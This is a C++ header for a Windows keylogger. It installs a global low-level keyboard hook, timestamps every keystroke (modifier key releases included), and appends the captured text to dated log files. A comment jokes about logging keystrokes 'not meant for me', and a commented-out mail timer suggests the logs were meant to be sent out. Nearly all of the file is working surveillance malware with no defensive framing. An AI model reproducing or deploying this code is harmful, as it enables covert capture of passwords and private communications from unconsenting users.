#pragma once

#ifndef _KEYLOGGER_H_
#define _KEYLOGGER_H_

#include <string>

#include "Applog.h"
#include "KeyConstants.h"

namespace keylogger {

	std::string keylog = "";
	HHOOK eHook = NULL;

	LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
		/*
			nCode < 0 means propagate hook
			wparam is our keytype
			lparam is type of kbdllhookstruct
		*/
		if (nCode < 0) {
			// no return statement here since i want to log key strokes even if they
			// are not meant for me. ;)
			CallNextHookEx(keylogger::eHook, nCode, wparam, lparam);
		}
		KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
		if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
			// checking if a key is held down;
			keylog += DateTime::GetCurrentTimeString() + ":" + Keys::KEYS[kbs->vkCode].name + "\n";
			/*
			if (kbs->vkCode == VK_RETURN)
				keylog += '\n';
			*/
		}
		else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
			DWORD key = kbs->vkCode;
			if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL
				|| key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT || key == VK_MENU
				|| key == VK_LMENU || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK
				|| key == VK_LWIN || key == VK_RWIN) {
				std::string key_name = Keys::KEYS[kbs->vkCode].name;
				key_name.insert(1, "/");
				keylog += DateTime::GetCurrentTimeString() + ":" + key_name + "\n";
			}
		}
		return CallNextHookEx(keylogger::eHook, nCode, wparam, lparam);
	}

	bool InstallHook() {
		AppLog::Write("Installing Keyboard Hook...");
		// MailTimer.Start(true);
		/*
			WH_KEYBOARD_LL : we use keyboard hook
			LL shorthand for LowLevel
			it indicates that it is global, constant value is 13

			OurKeyboardProc is called
		*/
		keylogger::eHook = SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
			GetModuleHandle(NULL), 0);
		return (bool)(keylogger::eHook != NULL);
	}

	bool UninstallHook() {
		AppLog::Write("Hook Removed...");
		BOOL b = UnhookWindowsHookEx(eHook);
		keylogger::eHook = NULL;
		return (bool)b;
	}

	bool IsHooked() {
		return (bool)(keylogger::eHook != NULL);
	}

	void WriteToFile() {
		// start by working in current directory
		std::string filename = DateTime::GetCurrentDateTimeString();
		filename = filename.substr(1, filename.size() - 2) + "-log.txt";
		std::fstream key_log_file(filename, std::ios::app);
		key_log_file << keylogger::keylog;
		key_log_file.close();
	}
}

#endif // _KEYLOGGER_H_